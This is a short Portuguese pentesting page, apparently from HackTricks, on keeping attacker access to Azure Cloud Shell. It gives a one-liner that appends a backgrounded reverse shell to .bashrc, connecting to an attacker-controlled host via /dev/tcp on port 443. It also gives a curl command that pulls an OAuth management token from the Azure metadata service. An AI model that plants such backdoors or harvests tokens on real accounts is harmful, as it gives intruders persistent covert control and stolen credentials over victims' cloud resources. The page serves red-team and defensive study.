# Az - Cloud Shell Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Persistência do Cloud Shell

O Azure Cloud Shell oferece acesso via linha de comando para gerenciar recursos do Azure com armazenamento persistente e autenticação automática. Os atacantes podem explorar isso colocando backdoors no diretório home persistente:

* **Armazenamento Persistente**: O diretório home do Azure Cloud Shell é montado em um compartilhamento de arquivos do Azure e permanece intacto mesmo após o término da sessão.
* **Scripts de Inicialização**: Arquivos como .bashrc são executados automaticamente no início de cada sessão, permitindo a execução persistente quando o cloud shell é iniciado.

Exemplo de backdoor em .bashrc:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc
```
Este backdoor pode executar comandos mesmo 5 minutos após o shell da nuvem ser finalizado pelo usuário.

Além disso, consulte o serviço de metadados do Azure para detalhes da instância e tokens:
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s
```
{{#include ../../../banners/hacktricks-training.md}}
